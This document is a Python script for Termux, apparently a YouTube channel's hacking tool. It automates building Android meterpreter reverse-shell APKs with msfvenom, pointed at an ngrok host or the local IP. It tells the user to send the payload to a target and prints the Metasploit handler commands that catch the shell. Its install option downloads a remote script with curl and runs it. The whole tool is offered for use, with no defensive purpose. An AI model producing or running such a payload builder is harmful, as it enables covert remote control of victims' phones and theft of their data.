import os, sys, time

os.system('git pull')
os.system('clear')
os.system('xdg-open https://www.youtube.com/c/pythonlife')
import socket
ip = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]
if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
socket.SOCK_DGRAM)]][0][1]]) if l][0][0])

print('\033[1;36m')
logo = """
                           dP                         dP 
                           88                         88 
88d888b. .d8888b. dP    dP 88 .d8888b. .d8888b. .d888b88 
88'  `88 88'  `88 88    88 88 88'  `88 88'  `88 88'  `88 
88.  .88 88.  .88 88.  .88 88 88.  .88 88.  .88 88.  .88 
88Y888P' `88888P8 `8888P88 dP `88888P' `88888P8 `88888P8 
88                     .88                               
dP                 d8888P Created By Python Life Channel                          
                        """
print(logo)

print('\033[1;34m{1} \033[1;35mInstall Metsploit')
print('\033[1;34m{2} \033[1;35mPayload Android OutSide\033[1;31mBy Ngrok')
print('\033[1;34m{3} \033[1;35mPayload Android \033[1;31mBy IP')
print('\033[1;34m{4} \033[1;35mFind me in Instagram')
print('\033[1;34m{0} \033[1;31mExit')

choose = input('\033[1;34m{?} \033[1;36mChoose > \033[1;34m')

if choose == '1':
    os.system('clear')
    print(logo)
    os.system(
        'pkg update && pkg upgrade && pkg install git curl wget nmap -y && curl -LO raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh && chmod 777 metasploit.sh && ./metasploit.sh')
    print('\033[1;31mPlease Wait')
    os.system('clear')
    print('Metasploit install successfully')
    os.system('msfconsole')


elif choose == '2':
    os.system('clear')
    print(logo)
    print('\033[1;36mPlease Run Ngrok Tool And Enter Port Here\n')

    port = input('\033[1;33mENTER PORT NGROK After tcp.ngrok.io:\033[1;31mxxxxxx\033[1;33m>\033[1;31m')
    host = input('ENTER First Number HOST NGROK : ')
    name = input('\033[1;33mENTER NAME FOR PAYLOAD   >\033[1;31m')
    print('\033[1;31mPlease Wait')
    os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={host}.tcp.ngrok.io LPORT={port} R> /sdcard/{name}.apk')
    os.system('clear')
    print(f'\033[1;33mNow You Can Find Payload in /sdcard/{name}.apk\n')
    print('\033[1;31mNow send Payload And Back Here And Type \n\033[1;31m')
    print('\033[1;37m$ \033[1;32muse exploit/multi/handler')
    print('\033[1;37m$ \033[1;32mset payload android/meterpreter/reverse_tcp')
    print('\033[1;37m$ \033[1;32mset LHOST localhost')
    print(f'\033[1;37m$ \033[1;32mset LPORT After localhost:\033[1;31mxxxx')
    print('\033[1;37m$ \033[1;32mexploit\n')
    os.system(f'msfconsole')

elif choose == '3':
    os.system('clear')
    print(logo)
    port = input('\033[1;33mENTER ANY PORT   >\033[1;31m')
    name = input('\033[1;33mENTER NAME FOR PAYLOAD  >\033[1;31m')
    print('\033[1;31mPlease Wait')
    os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R> /sdcard/{name}.apk')
    os.system('clear')
    print(f'\033[1;33mNow You Can Find Payload in /sdcard/{name}.apk\n')
    print('\033[1;31mNow send Payload And Back Here And Type \n\033[1;31m')
    print('\033[1;37m$ \033[1;32muse exploit/multi/handler')
    print('\033[1;37m$ \033[1;32mset payload android/meterpreter/reverse_tcp')
    print(f'\033[1;37m$ \033[1;32mset LHOST localhost')
    print(f'\033[1;37m$ \033[1;32mset LPORT {port}')
    print('\033[1;37m$ \033[1;32mexploit\n')
    os.system(f'msfconsole')




elif choose == '4':
    os.system('clear')
    print(logo)
    os.system('xdg-open https://www.instagram.com/python.life')

elif choose == '0':
    os.system('clear')
    print(logo)
    os.system('xdg-open https://www.youtube.com/c/pythonlife')
    os.system('exit')
else:
    print('\033[1;37mPlease Choose Only 1 Or 2 Or 3 For \033[1;31mExit')
